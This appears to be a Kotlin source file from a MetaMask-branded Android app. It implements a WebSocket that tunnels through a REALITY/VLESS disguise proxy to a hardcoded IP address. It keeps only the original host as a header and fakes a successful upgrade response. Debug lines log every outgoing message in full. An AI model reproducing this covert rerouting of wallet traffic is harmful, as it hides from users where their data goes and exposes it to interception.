package com.example.MetaMask.utils

import android.util.Log
import okhttp3.*
import okio.ByteString
import java.io.IOException

class RealityWebSocket(
    private val originalRequest: Request,
    private val wsPath: String,
    private val wsQuery: String,
    private val listener: WebSocketListener
) : WebSocket {

    private val TAG = "REALITY_WS"

    @Volatile private var handle: Long = -1L
    @Volatile private var closed = false

    init {
        Log.i(TAG, "RealityWebSocket created  path=$wsPath  query=$wsQuery")
        Thread({
            try {
                val srv = RealityConfig.pickServer()
                if (srv == null) {
                    Log.e(TAG, "no REALITY servers available yet")
                    if (!closed) listener.onFailure(this, java.io.IOException("no REALITY servers"), null)
                    return@Thread
                }
                Log.d(TAG, "connecting to ${srv.host}:${srv.port} ...")
                val t0 = System.currentTimeMillis()

                // Use original request's host as Host header so nginx vhost matches
                val wsHost = originalRequest.url.host
                Log.d(TAG, "ws_host from originalRequest.url.host = $wsHost")
                val h = RealityTransport.connect(
                    server      = srv.host,
                    port        = srv.port,
                    serverPub   = srv.publicKey,
                    vlessUuid   = RealityConfig.VLESS_UUID,
                    targetHost  = "157.22.190.49",
                    targetPort  = 8080,
                    wsPath      = wsPath,
                    wsQuery     = wsQuery,
                    wsHost      = wsHost
                )

                if (h < 0L || closed) {
                    Log.e(TAG, "REALITY connect failed (handle=$h closed=$closed)")
                    if (!closed) {
                        RealityConfig.nextServer()
                        listener.onFailure(this, IOException("REALITY connect failed"), null)
                    }
                    return@Thread
                }

                handle = h
                val elapsed = System.currentTimeMillis() - t0
                Log.i(TAG, "REALITY + WS upgrade OK  handle=$h  ${elapsed}ms")

                val fakeResponse = Response.Builder()
                    .request(originalRequest)
                    .protocol(Protocol.HTTP_1_1)
                    .code(101)
                    .message("Switching Protocols")
                    .build()
                listener.onOpen(this, fakeResponse)
                Log.d(TAG, "onOpen fired")

                var msgCount = 0L
                while (!closed) {
                    val data = RealityTransport.receive(handle) ?: break
                    if (data.isEmpty()) continue
                    msgCount++
                    Log.v(TAG, "onMessage #$msgCount  bytes=${data.size}")
                    listener.onMessage(this, String(data, Charsets.UTF_8))
                }

                Log.i(TAG, "read loop ended  closed=$closed  msgs=$msgCount")
                if (!closed) {
                    listener.onClosed(this, 1000, "EOF")
                }
            } catch (e: Exception) {
                android.util.Log.e("XDBG", "[RealityWebSocket] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
                Log.e(TAG, "exception in REALITY thread: ${e::class.simpleName}: ${e.message}")
                if (!closed) {
                    RealityConfig.nextServer()
                    listener.onFailure(this, e, null)
                }
            }
        }, "reality-ws").apply { isDaemon = true; start() }
    }

    override fun request(): Request = originalRequest

    override fun queueSize(): Long = 0L

    override fun send(text: String): Boolean {
        android.util.Log.d("XDBG", "[RealityWebSocket] send enter text=${text}") //xdbg
        val h = handle
        if (closed || h < 0L) {
            Log.w(TAG, "send skipped  closed=$closed handle=$h  text=${text.take(80)}")
            return false
        }
        val ok = try {
            RealityTransport.send(h, text.toByteArray(Charsets.UTF_8))
        } catch (e: Exception) {
            android.util.Log.e("XDBG", "[RealityWebSocket] catch Exception ${e.javaClass.simpleName}: ${e.message}") //xdbg
            Log.e(TAG, "send exception: ${e.message}")
            false
        }
        Log.v(TAG, "send  ok=$ok  bytes=${text.length}")
        return ok
    }

    override fun send(bytes: ByteString): Boolean = send(bytes.utf8())

    override fun close(code: Int, reason: String?): Boolean {
        android.util.Log.d("XDBG", "[RealityWebSocket] close enter code=${code} reason=${reason}") //xdbg
        if (closed) return true
        Log.i(TAG, "close  code=$code reason=$reason")
        closed = true
        val h = handle
        if (h >= 0L) {
            handle = -1L
            RealityTransport.close(h)
        }
        return true
    }

    override fun cancel() {
        Log.i(TAG, "cancel  handle=$handle")
        closed = true
        val h = handle
        if (h >= 0L) {
            handle = -1L
            RealityTransport.close(h)
        }
    }
}
